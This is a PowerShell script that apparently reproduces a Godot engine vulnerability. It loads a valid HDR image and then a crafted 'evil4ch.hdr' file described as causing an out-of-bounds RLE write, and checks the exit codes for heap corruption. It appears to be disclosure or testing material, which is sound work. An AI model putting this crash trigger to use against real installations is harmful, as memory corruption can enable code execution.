param([Parameter(Mandatory)][string]$Godot)

$proj = $PSScriptRoot

Write-Host ""
Write-Host "=== BASELINE: ok.hdr (valid file, same dimensions) ==="
$p1 = Start-Process -FilePath $Godot `
    -ArgumentList "--headless --path `"$proj`" --script repro.gd -- res://ok.hdr" `
    -Wait -NoNewWindow -PassThru `
    -RedirectStandardOutput "$env:TEMP\ok_out.txt" `
    -RedirectStandardError  "$env:TEMP\ok_err.txt"
$okCode = [int]$p1.ExitCode
Write-Host "  exit code: $okCode"

Write-Host ""
Write-Host "=== TRIGGER: evil4ch.hdr (crafted - OOB RLE dump on all 4 channels) ==="
$p2 = Start-Process -FilePath $Godot `
    -ArgumentList "--headless --path `"$proj`" --script repro.gd -- res://evil4ch.hdr" `
    -Wait -NoNewWindow -PassThru `
    -RedirectStandardOutput "$env:TEMP\evil_out.txt" `
    -RedirectStandardError  "$env:TEMP\evil_err.txt"
$evilCode = [int]$p2.ExitCode
$evilHex  = "0x{0:X8}" -f [int32]$evilCode
Write-Host "  exit code: $evilCode  ($evilHex)"

Write-Host ""
if ($okCode -eq 0 -and $evilCode -eq -1073740940) {
    Write-Host "RESULT: CRASH CONFIRMED - STATUS_HEAP_CORRUPTION (0xC0000374)" -ForegroundColor Red
    Write-Host "  Baseline clean (0). Evil file caused heap corruption crash." -ForegroundColor Red
} elseif ($okCode -eq 0 -and $evilCode -ne 0) {
    Write-Host "RESULT: CRASH CONFIRMED - non-zero exit $evilCode ($evilHex)" -ForegroundColor Red
} elseif ($evilCode -eq 0) {
    Write-Host "RESULT: No crash this run (heap layout did not expose corruption this time)." -ForegroundColor Yellow
    Write-Host "  The OOB write still occurred. Try on Linux for a deterministic SIGSEGV." -ForegroundColor Yellow
} else {
    Write-Host "RESULT: Unexpected - baseline=$okCode evil=$evilCode" -ForegroundColor Yellow
}
